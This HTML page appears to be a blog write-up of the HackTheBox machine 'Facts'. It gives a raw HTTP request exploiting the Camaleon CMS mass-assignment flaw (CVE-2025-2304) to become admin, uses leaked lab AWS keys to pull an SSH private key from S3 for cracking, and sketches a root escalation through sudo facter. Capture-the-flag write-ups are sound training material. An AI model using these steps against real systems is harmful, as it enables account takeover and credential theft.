@@ -1,0 +1,50 @@
+<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>Facts - HackTheBox | Askiesec</title><link rel=stylesheet href=/css/style.css></head><body><header><a href=/>Askiesec</a><nav><a href=/>home</a>
+<a href=/writeups/>writeups</a>
+<a href=/posts/>posts</a></nav></header><main><article><h1 style=margin-bottom:.5rem>Facts - HackTheBox</h1><div style=color:var(--meta-color);font-family:var(--font-mono);font-size:.9em;margin-bottom:2rem><time datetime=2026-05-21>2026-05-21</time>
+<span style="margin:0 .5rem">&#183;</span>
+<span>~2 min read</span>
+<span style="margin:0 .5rem">&#183;</span>
+<a href=/tags/writeups style=color:var(--meta-color)>#writeups</a>
+<a href=/tags/hackthebox style=color:var(--meta-color)>#hackthebox</a></div><div class=content><h2 id=recon>Recon</h2><p>Starting with a full service scan:</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>nmap -vv --reason -sCV -T4 -oN outputs/nmap 10.129.19.102
+</span></span></code></pre></div><p><img src=E559948A-0A15-4AC5-A56C-D9DB341494C4.png alt="alt text"></p><p>The scan revealed a web server. Based on the response headers and SSL certificate, I added <code>facts.htb</code> to <code>/etc/hosts</code> and browsed to the site.</p><p><img src=FDDCBA3A-6A94-4B7E-8624-9A19E33DC3D8.png alt="alt text"></p><h2 id=web-enumeration>Web Enumeration</h2><p>During manual fuzzing, a request to <code>/assets/themes/camaleon</code> leaked the CMS being used:</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-fallback data-lang=fallback><span style=display:flex><span>GET /assets/themes/camaleon HTTP/1.1
+</span></span><span style=display:flex><span>Host: facts.htb
+</span></span></code></pre></div><p><img src=8FA6A7FA-F437-4A1E-A9A5-296322E06A3D.png alt="alt text"></p><p><a href=https://github.com/owen2345/camaleon-cms>Camaleon CMS</a> is a CMS built on Ruby on Rails. The admin panel is available at the default route: <code>http://facts.htb/admin/login</code></p><p><img src=70DD9665-327C-4A2C-AD00-96390AAA87A4.png alt="alt text"></p><p>I created a regular user account. The footer immediately disclosed the running version: <code>2.9.0</code>
+<img src=8C818134-9415-4059-9822-A3CFCFED9D65.png alt="alt text"></p><h2 id=exploitation---cve-2025-2304>Exploitation - CVE-2025-2304</h2><p>Searching for CVEs affecting Camaleon 2.9.0, I found a mass assignment vulnerability (CWE-915). When a user changes their password, the <code>updated_ajax</code> method in <code>UsersController</code> is called. The root cause is the use of Rails&rsquo; <code>permit!</code> method, which bypasses Strong Parameters entirely and lets any user-supplied parameter through without filtering:</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ruby data-lang=ruby><span style=display:flex><span><span style=color:#fe8019>def</span> <span style=color:#fabd2f>updated_ajax</span>
+</span></span><span style=display:flex><span>  @user <span style=color:#fe8019>=</span> current_site<span style=color:#fe8019>.</span>users<span style=color:#fe8019>.</span>find(params<span style=color:#fe8019>[</span><span style=color:#83a598>:user_id</span><span style=color:#fe8019>]</span>)
+</span></span><span style=display:flex><span>  @user<span style=color:#fe8019>.</span>update(params<span style=color:#fe8019>.</span>require(<span style=color:#83a598>:password</span>)<span style=color:#fe8019>.</span>permit!)
+</span></span><span style=display:flex><span>  <span style=color:#fe8019>...</span>
+</span></span><span style=display:flex><span><span style=color:#fe8019>end</span>
+</span></span></code></pre></div><p>This means a low-privileged user can inject a <code>role</code> parameter into what looks like a password change request and promote themselves to admin:</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#fabd2f>POST</span> /admin/users/5/updated_ajax <span style=color:#fe8019>HTTP</span><span style=color:#fe8019>/</span><span style=color:#d3869b>1.1</span>
+</span></span><span style=display:flex><span>Host<span style=color:#fe8019>:</span> facts.htb
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>password[password]=newpass&amp;password[role]=admin
+</span></span></code></pre></div><p>I wrote a Python script to automate the full flow (login, CSRF token extraction, role escalation):</p><p><a href=https://github.com/askiesec/CVE-2025-2304-POC>CVE-2025-2304-POC</a></p><p>With admin access confirmed, I browsed to the site settings panel: <code>http://facts.htb/admin/settings/site</code></p><p><img src=B456A30A-AFA0-46BA-89A6-157471BA3FDC.png alt="alt text"></p><h2 id=aws-credential-exposure>AWS Credential Exposure</h2><p>The admin settings panel exposed the full AWS configuration of the machine in plaintext, including access keys, secret keys, region, and bucket name.</p><p><img src=3FF7F2BE-3347-40B3-9339-065C3A29F475.png alt="alt text"></p><h2 id=ssh-key-and-credential-cracking>SSH Key and Credential Cracking</h2><p>Using the AWS credentials I accessed the S3 bucket and retrieved a private SSH key. After setting the correct permissions:</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-zsh data-lang=zsh><span style=display:flex><span><span style=color:#928374;font-style:italic># Configure AWS profile with leaked credentials</span>
+</span></span><span style=display:flex><span>$ aws configure --profile facts.htb
+</span></span><span style=display:flex><span>AWS Access Key ID: AKIAF4SD97D8C66E148F
+</span></span><span style=display:flex><span>AWS Secret Access Key: NkFNLgWn57jFtQS8cTNk40ReIXuZ3CfsUh5e5Ywp
+</span></span><span style=display:flex><span>Default region name: us-east-1
+</span></span><span style=display:flex><span>Default output format: json
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic># Point to the machine&#39;s S3-compatible endpoint</span>
+</span></span><span style=display:flex><span>$ aws configure <span style=color:#fabd2f>set</span> endpoint_url http://facts.htb:54321
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic># List available buckets</span>
+</span></span><span style=display:flex><span>$ aws s3 ls
+</span></span><span style=display:flex><span>2025-09-11 09:06:52 internal
+</span></span><span style=display:flex><span>2025-09-11 09:06:52 randomfacts
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic># List contents of the internal bucket</span>
+</span></span><span style=display:flex><span>$ aws s3 ls internal/.ssh/
+</span></span><span style=display:flex><span>2026-06-06 13:48:10    <span style=color:#d3869b>82</span> authorized_keys
+</span></span><span style=display:flex><span>2026-06-06 13:48:10   <span style=color:#d3869b>464</span> id_ed25519
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic># Download the private key</span>
+</span></span><span style=display:flex><span>$ aws s3 cp s3://internal/.ssh/id_ed25519 id_ed25519
+</span></span><span style=display:flex><span>download: s3://internal/.ssh/id_ed25519 to ./id_ed25519
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic># Fix permissions</span>
+</span></span><span style=display:flex><span>$ chmod <span style=color:#d3869b>600</span> id_ed25519
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic># Convert to john format</span>
+</span></span><span style=display:flex><span>$ ssh2john id_ed25519 &gt; ssh.hash
+</span></span></code></pre></div><p><img src=BA0AAFE7-637A-4CC8-A0F4-824812E929DA.png alt="alt text"></p><p><img src=BA6F164F-E241-4437-AC1A-B4DD736318F8.png alt="alt text"></p><h2 id=privilege-escalation>Privilege Escalation</h2><p><img src=3BF905BE-7EB9-459E-9A98-DBB35A8701D2.png alt="alt text"></p><p>The user could run <code>facter</code> as root without a password. According to <a href=https://gtfobins.github.io/gtfobins/facter/>GTFOBins</a>, <code>facter</code> supports loading custom facts from an arbitrary directory via <code>--custom-dir</code>. A custom fact is just a Ruby file, so this effectively gives arbitrary code execution as root.</p><p>Creating the malicious custom fact in <code>/dev/shm</code>:</p><p><img src=9940B8BD-0AC6-4EDC-8A59-42EC406A75FF.png alt="alt text"></p></div></article></main><footer><p>&copy; 2026 askiesec. Construído com Markdown.</p></footer></body></html>
